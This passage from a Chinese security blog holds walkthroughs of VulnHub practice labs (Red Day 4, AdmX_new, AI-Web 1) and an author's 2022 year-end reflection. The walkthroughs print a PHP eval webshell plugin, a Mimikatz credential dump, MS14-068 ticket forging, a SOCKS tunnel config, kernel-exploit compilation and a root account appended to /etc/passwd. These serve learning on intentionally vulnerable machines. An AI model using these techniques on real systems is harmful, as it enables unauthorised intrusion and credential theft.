alt="image">​</p><p>这里发现存在上传</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118432.png" alt="image">​</p><p>但猜测这里是include了我刚才扫到的add.php</p><p>那其实很容易想到如果我在这上传图片马然后用上面的test去包含一下不就getshell了吗？</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118935.png" alt="image">​</p><p>但是包含不解析啊</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118173.png" alt="image">​</p><p>看wp发现在另一个php文件当中存在文件包含(人麻了咋这么乱这个靶场那就是这个phpmyadmin跟什么)</p><p>在这里进行文件包含</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118314.png" alt="image">​</p><p>‍</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>‍</p><p>然后生成了msf的反弹php的马，然后上传图片马然后在这里进行远程文件包含成功上马子(喵的 一定要用kali里头的反弹php马才行 msf的会断的 真服了)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118611.png" alt="image">​</p><p>先升级一下shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>‍</p><p>查看内核</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118736.png" alt="image">​</p><p>找exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit linux 3.13.0<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118848.png" alt="image">​</p><p>查看靶机是否存在gcc</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118959.png" alt="image">​</p><p>发现存在那么通过上传c文件进行gcc编译后提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/exploitdb/exploits/linux/local/37292.c<br>gcc exp.c -o exp <br>./exp<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118268.png" alt="image">​</p><p>打靶结束</p><p>‍</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>‍</p><p>目录扫描是突破口，然后文件包含读源码审计sql进后台上传再包含反弹php马上shell后内核提权，比较简单，但是靶场做的真的乱</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - VulnHub - 红日(四)</title>
    <link href="/post/target-vulnhub-red-day-4-idb1b.html"/>
    <url>/post/target-vulnhub-red-day-4-idb1b.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p><p>‍</p><p>本次打靶算是中等难度，可以去学习下关于内网穿透和常见后渗透技巧  涉及知识点如下</p><ol><li>信息收集</li><li>Nday</li><li>Docker逃逸</li><li>内网穿透</li><li>域渗透</li><li>进程注入</li></ol><p>‍</p><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">masscan -p 1-65535 192.168.111.138 --rate=10000<br><br>nmap -sV 192.168.111.138 -sC -p 2002,2001,2003,22<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140540.png" alt="image">​</p><p>‍</p><h2 id="Nday"><a href="#Nday" class="headerlink" title="Nday"></a>Nday</h2><p>可以看到 2001是struts2 2002是tomcat 2003是phpmyadmin，应该都存在漏洞，先拿nday打2001</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140788.png" alt="image">​</p><p>找到入口上webshell</p><p>但是发现存在Dockerfile</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140976.png" alt="image">​</p><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>判断一下是否是在docker里头</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140119.png" alt="image">​</p><p>确实是在docker环境，那么现在就有两种解决办法</p><ol><li>逃逸当前docker</li><li>还有其他端口，看是否其他端口为docker 如果都是docker，是否有存在某个docker可以进行逃逸呢</li></ol><p>‍</p><p>emm查看了一下发现不是特权模式，再去看看别的端口</p><p>‍</p><p>tomcat是put文件上传</p><p>phpmyadmin是文件包含getshell</p><p>一番寻找后在tomcat的容器当中发现了tomcat是通过特权模式进行启动的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140244.png" alt="image">​</p><p>逃逸成功</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140402.png" alt="image">​</p><p>这里应该是可以写定时任务的 但是没复现成功诶 奇奇怪怪 于是就写ssh的公钥和私钥进行私钥上ssh了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">我们使用kali先生成一对密钥<br>ssh-keygen -f shell  <span class="hljs-comment">#然后按三次回车即可   默认生成在用户目录下的.ssh文件夹内 密钥名为shell</span><br>shell是私钥，shell.pub是公钥，我们只需要把公钥写入到目标机器，就可以指定私钥去进行登录<br></code></pre></td></tr></table></figure><p>‍</p><p>还有个思路就是反弹计时任务 但是都不行 只好直接连接密码了</p><p>‍</p><p>得到当前机子的shell了</p><p>进行linux的信息收集</p><p>ifconfig</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140770.png" alt="image">​</p><p>‍</p><p>传fscan上去扫一下他的C段</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140902.png" alt="image">​</p><p>‍</p><h2 id="内网穿透打MS17010"><a href="#内网穿透打MS17010" class="headerlink" title="内网穿透打MS17010"></a>内网穿透打MS17010</h2><p>那么隧道进ubuntu打ms17010</p><p>先把frpc传到ubuntu上然后后台运行frpc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp; #后台运行<br><br>frpc.ini<br><br>[common]<br>server_addr = 192.168.184.129<br>server_port = 444<br><br>[socks5]<br>type = tcp<br>plugin=socks5<br>remote_port = 5000<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140029.png" alt="image">​</p><p>然后给msf上全局代理走本机的5000端口的socks5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">setg proxies socks5:127.0.0.1:5000<br></code></pre></td></tr></table></figure><p>发现存在两台主机，并且都存在ms17010于是直接上msf直接开打</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140157.png" alt="image">​</p><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>bg一下再打过另一台</p><p>但是一直没成功 不知道是不是DC的原因确实是没拿下，可能题目设计就是打不通ms17010吧(不然都直接拿下域控了)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chcp 65001 #修改编码为utf-8 乱码   936为GBK<br></code></pre></td></tr></table></figure><p>进来后kiwi抓一下密码先</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140282.png" alt="image">​</p><p>可以抓到时明文的密码 douser:Dotest123</p><p>那我们现在就两个思路</p><ol><li>利用明文密码进行横向到DC</li><li>域提权漏洞直接打DC</li></ol><p>但现在我需要模拟一下存在杀毒的情况，执行的操作都不可以，那么思路就是进3389把杀毒给关掉</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -ano | findstr 3389<br></code></pre></td></tr></table></figure><p>发现并没有开3389 于是就让他开起来</p><p>然后用kali里面的FreeRDP进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">xfreerdp /u:douser /p:Dotest123 /v:192.168.183.130:3389 /tls-seclevel:0 /timeout:80000<br><br>或者是<br>rdesktop 192.168.183.130<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140422.png" alt="image">​</p><p>修改一下administrator的密码重新登录把</p><p>改完发现还得改一下停用信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user administrator Admin123<br>net user administrator /active:yes<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140532.png" alt="image">​</p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>‍</p><p>既然已经进去了administrator了 msf上迁移注入一下域用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -aux<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140819.png" alt="image">​</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">migrate 1800<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140009.png" alt="image">​</p><p>通过这个用户来上线CS</p><p>但是折腾半天上线不了CS啊</p><p>‍</p><h2 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h2><p>只好直接用域提权漏洞直接打了</p><p>先拿到域内用户的SID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">whoami /all <br>S-1-5-21-979886063-1111900045-1414766810-1107<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140147.png" alt="image">​</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">MS14-068.exe -u douser@demo.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.138 -p Dotest123<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140256.png" alt="image">​</p><p>得到一个TGT然后mimikaz导入后再进行横向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe<br>kerberos::list  #查看全部凭证<br><br>kerberos::purge #先清空一下凭证<br><br>kerberos::ptc TGT_douser@demo.com.ccache<br><br>dir \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h2 id="拓扑分析"><a href="#拓扑分析" class="headerlink" title="拓扑分析"></a>拓扑分析</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061140398.png" alt="image">​</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - VulnHub - AdmX_new</title>
    <link href="/post/target-vulnhub-admxnew-z9aqij.html"/>
    <url>/post/target-vulnhub-admxnew-z9aqij.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p><p>‍</p><p>本次打靶非常适合入门级别的师傅 简单易懂 涉及知识点如下</p><ol><li>信息收集</li><li>爆破</li><li>Nday</li><li>提权</li></ol><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描得到三个端口开放</p><p>80 25 110</p><p>namp端口指纹一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 192.168.184.139 -sC -p 110,80,25<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128770.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128016.png" alt="image">​</p><p>那么先从80入手</p><p>直接扫目录</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128123.png" alt="image">​</p><p>跑出wordpress目录</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>‍</p><p>爆破后台</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128233.png" alt="image">​</p><p>得到密码是adam14 成功进入后台</p><p>‍</p><h2 id="wordpressNday"><a href="#wordpressNday" class="headerlink" title="wordpressNday"></a>wordpressNday</h2><p>这里进行wordpress的后台getshell</p><ol><li>Media -&gt; 可以上传文件getshell</li><li>Appearance -&gt; Theme view 直接php文件(404模版)写php反弹shell</li><li>plugins 插件源码</li></ol><p>那么这里就是利用到新增加的插件来进行getshell</p><p>写一个插件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Webshell</span><br><span class="hljs-comment">Plugin URI: http://wordpress.org/plugins/hello-dolly/</span><br><span class="hljs-comment">Description: zjacky</span><br><span class="hljs-comment">Author: zjacky</span><br><span class="hljs-comment">Version: 1.0</span><br><span class="hljs-comment">Author URI: http://ma.tt/</span><br><span class="hljs-comment">License: https://yuanfh.github.io</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;asd&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>然后打包成zip上传激活</p><p>默认的路径为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.184.139/wordpress/wp-content/plugins/wp-plugin.php<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128375.png" alt="image">​</p><p>‍</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上shell后进行提权先看suid</p><p>emm好像也没啥东西</p><p>但是发现home目录下有东西需要提权 ，所以先尝试su爆破，wpadmin，通过后台密码adam14成功登陆wpadmin</p><p>得到了这个家目录下的东西，通过sudo -l 发现了存在suid 直接提权成root</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128516.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128627.png" alt="image">​</p><p>发现不需要root密码的是这个mysql ，那么查看mysql的help的时候可以发现存在system的权限 通过system去执行系统命令从而拿到root的bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">system /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128735.png" alt="image">​</p><p>‍</p><p>打靶结束</p><p>‍</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>‍</p><p>从web端扫到wordpress，通过爆破后台进入后台通过插件来写shell，然后通过密码复用来su到wpadmin上suid打mysql的system执行命令提权root</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - VulnHub - AI-Web 1</title>
    <link href="/post/target-vulnhub-ai-web-1-1a4xey.html"/>
    <url>/post/target-vulnhub-ai-web-1-1a4xey.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p><p>‍</p><p>本次打靶非常适合入门级别的师傅 简单易懂 涉及知识点如下</p><ol><li>信息收集</li><li>文件上传</li><li>写passwd提权</li></ol><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>攻击机 192.168.112.128</p><p>靶机 192.168.112.150</p><p>端口扫描</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139816.png" alt="image">​</p><p>扫出robots.txt</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139216.png" alt="image">​</p><p>扫出两个页面</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139324.png" alt="image">​</p><p>查看info.php</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139465.png" alt="image">​</p><p>是phpinfo探针并且发现了网站根目录</p><p>其次是</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139590.png" alt="image">​</p><p>‍</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>存在sql注入</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139699.png" alt="image">​</p><p>但是注入进去后发现其实就是页面上的东西压根没啥 那么这个时候就要想 sql注入能干吗？</p><p>写马啊!</p><p>但是–is-dba却不是dba用户</p><p>查看权限看看</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139824.png" alt="image">​</p><p>发现竟然能写文件！而且还知道网站根目录 那么就是直接outfile写马</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139964.png" alt="image">​</p><p>但一直上传不上去 后来看了wp才知道原来之前有个目录是可以上传的&#x2F;se3reTdir777&#x2F;uploads&#x2F;</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139119.png" alt="image">​</p><p>反弹成功进入shell命令</p><p>找了sudo suid 等都没有结果 看看etc&#x2F;passwd</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139293.png" alt="image">​</p><p>竟然发现所属者就是该用户</p><p>‍</p><h2 id="写passwd"><a href="#写passwd" class="headerlink" title="写passwd"></a>写passwd</h2><p>‍</p><p>那么直接写新的用户进去即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo admin:\$1\$admin\$1kgWpnZpUx.vTroWPXPIB0:0:0:/root:/bin/bash&gt;&gt;passwd<br><br>openssl passwd -1 -salt admin admin <br>openssl # 生成用户密码<br>-1      # 是指定md5<br>-salt   # 是去盐<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139678.png" alt="image">​</p><p>需要一个终端？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>提权成功</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061139842.png" alt="image">​</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>总结 - 2022年度总结</title>
    <link href="/post/summary-2022-ziv4pi.html"/>
    <url>/post/summary-2022-ziv4pi.html</url>
    
    <content type="html"><![CDATA[<h1 id="总结-2022年度总结"><a href="#总结-2022年度总结" class="headerlink" title="总结 - 2022年度总结"></a>总结 - 2022年度总结</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间翻到自己2022年在@星盟安全团队写的2022年报，于是看看自己当时如何写的，写了啥问题 ，立下了什么flag，因为现在也在写2023的总结了，感觉还是有点成长的</p><h1 id="Zjacky-2022年报"><a href="#Zjacky-2022年报" class="headerlink" title="Zjacky-2022年报"></a>Zjacky-2022年报</h1><p>‍</p><h2 id="自己如何看待自己"><a href="#自己如何看待自己" class="headerlink" title="自己如何看待自己"></a>自己如何看待自己</h2><ul><li><p>多角度的剖析与反思</p><p>关于反思的话：首先我学习安全的时间是非常有限的，有句话说得好 “大一是为了明确大学剩下三年的努力的方向” 没错 我大一确实是在寻找我未来努力的方向，最后在大一下学期，也就是今年五月尾才开始去了解信息安全这个行业，刚开始对这个行业从了解CTF，学习安全知识，最初的时候真的好难熬，什么都看不懂就是硬看，花了三四个月左右吧，才相当于是能看懂吧，我之前其实没有接触过安全，只是略懂一点C语言，所以我是直接Web入门先的，过程比较艰难，不过我知道自己是愿意去学，努力去学的，也慢慢的了解什么叫触类旁通吧。其次 我有点不太容易去沉淀自己，甚至说”对自己过于相信了” 我很简单的例子 SQL注入，我看了一遍后觉得会了，自己写 忘记了 看了第二遍会了 自己在本地写会了 但是打CTF却不会，这就是没有真正沉淀自己的结果，所以在接下来的日子里面我希望我能够好好的把自己所学的，好好的内化，去总结，去加深印象！</p></li><li><p>发现和总结自己的方法</p><p>首先我觉得我个人是一个在学习上有着很强烈欲望的人，在兴趣和坚持的驱使下我会更加有热度去学习这方面的知识，在学习的领域当中，我觉得很重要的东西就是 1 兴趣 2 不懂就要问 3 不要放过一切你不懂的点  这是我学习的方法吧，其实问这个东西真的很奇妙 ，你能问出来说明你思考了，对方能回答出来了对方说明真的理解了，在问与答的过程当中，就是一个提升自我的特别宝贵的经历，我十分珍惜那些骂我的，说我的师傅，其实只有骂 ，说，这样子才能把我发问的问题解决啊！ 这就是问题的艺术吧。</p></li></ul><p>‍</p><h2 id="今年做了哪些事情"><a href="#今年做了哪些事情" class="headerlink" title="今年做了哪些事情"></a>今年做了哪些事情</h2><ul><li>2022粤盾护网行动</li><li>中国机器人及人工智能大赛全国总决赛全国三等奖</li><li>羊城杯三十多名</li><li>挖了一些Edusrc吧拿了些证书</li></ul><p>‍</p><h2 id="今年自己面临的挑战和遭遇的问题，以及如何去克服的"><a href="#今年自己面临的挑战和遭遇的问题，以及如何去克服的" class="headerlink" title="今年自己面临的挑战和遭遇的问题，以及如何去克服的"></a>今年自己面临的挑战和遭遇的问题，以及如何去克服的</h2><p>CTF中的知识点好多 路还有好远，在接下来的一年里面，我会积极参与团队各种比赛和活动，积极与师傅们一起讨论 学习</p><p>‍</p><h2 id="自己的劣势分析"><a href="#自己的劣势分析" class="headerlink" title="自己的劣势分析"></a>自己的劣势分析</h2><p>劣势上的话我在接下来的一年里我必须好好研究技术层次的问题，特别是关于代码审计上的能力，毕竟开发上的安全才是真正厉害的，对于在CTF上的话我也要跟好师傅们的步伐，在师傅们的带领下希望能够在比赛上输出，人文方面的话我希望能够广交朋友吧，人情世故还是很重要的！</p><p>‍</p><h2 id="今年那些喜悦、遗憾和最难忘的事"><a href="#今年那些喜悦、遗憾和最难忘的事" class="headerlink" title="今年那些喜悦、遗憾和最难忘的事"></a>今年那些喜悦、遗憾和最难忘的事</h2><p>我认为今年最大的喜悦就是能够遇到师傅们加入了@星盟安全团队，以及遇到了我很多安全上的好师傅们，他们愿意为我解答，为我引路，让我快速成长，特别感谢他们，比较遗憾的话就是我接触安全领域时间太短啦！大一上也算是忙着玩了，希望在接下来的路上再接再厉吧！</p><p>‍</p><p>‍</p><h2 id="今年自己的进步与成长收获（和去年做一个比较）"><a href="#今年自己的进步与成长收获（和去年做一个比较）" class="headerlink" title="今年自己的进步与成长收获（和去年做一个比较）"></a>今年自己的进步与成长收获（和去年做一个比较）</h2><p>今年收获肯定很大，因为今年是我接触安全的第一年，首年肯定嘎嘎幸运，快速成长起来，去年我还是在为进入了个普通本科而发愁呢，当时高考不理想消沉了一段时间呢，不过这不重要了，既然选择了安全，那就在2023年不顾一切的冲吧</p><p>‍</p><p>‍</p><h2 id="明年你对自己有哪些期望，以及明年的计划及flag"><a href="#明年你对自己有哪些期望，以及明年的计划及flag" class="headerlink" title="明年你对自己有哪些期望，以及明年的计划及flag"></a>明年你对自己有哪些期望，以及明年的计划及flag</h2><p>明年你对自己有哪些期望来年我会均衡好CTF和渗透的学习，边学边实践，flag的话我想挖到人生第一个CNVD，以及CTF大赛中获一次前三</p><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. <span class="hljs-comment"># 挖到人生第一个CNVD/CVE </span><br>2. <span class="hljs-comment"># 护网蓝中                                   </span><br>3. <span class="hljs-comment"># CTF赛事进一次前三                            </span><br>4. <span class="hljs-comment"># 跟女朋友长长久久                             </span><br>5. <span class="hljs-comment"># 拿到5张edu的证书                           </span><br>6. <span class="hljs-comment"># 搭建一台环境很棒的服务器                       </span><br>7. <span class="hljs-comment"># 在先知社区发表一篇文章                      </span><br>8. <span class="hljs-comment"># 打够一百台靶机(/100)                       </span><br>9. <span class="hljs-comment"># 做一次渗透的项目                           </span><br>10.<span class="hljs-comment"># 拿一次奖学金                               </span><br></code></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>我相信既然学不死就往死里学啊，家里不是能躺平的家庭就无脑向前冲吧，热爱安全，冲冲冲！团队太棒啦！真的给了我意想不到的一个集体，所有的师傅都是为了一个方向一起去学习，一起去讨论，师傅们都特别好，开会 总结 周报 聊天 等等 都让我们成为了一个很好的大家庭吧，我真的很荣幸加入并且珍惜这里的一切机会</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
